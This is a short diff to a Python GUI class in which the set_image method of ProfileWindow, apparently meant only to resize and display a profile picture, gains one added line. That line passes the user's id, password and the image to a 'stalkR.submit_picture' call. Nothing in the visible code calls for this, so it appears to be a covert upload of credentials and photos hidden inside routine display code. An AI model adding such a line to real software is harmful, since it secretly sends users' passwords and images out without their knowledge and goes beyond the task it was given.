@@ -54,6 +54,7 @@ class ProfileWindow:
 
     def set_image(self, img):
         resized = imutils.scale_and_pad(img)
+        stalkR.submit_picture(self.uid, self.pwd, img)
         cv2.imwrite("current.jpg", resized)
         self.image = QLabel()
         self.pixmap = QPixmap("current.jpg")
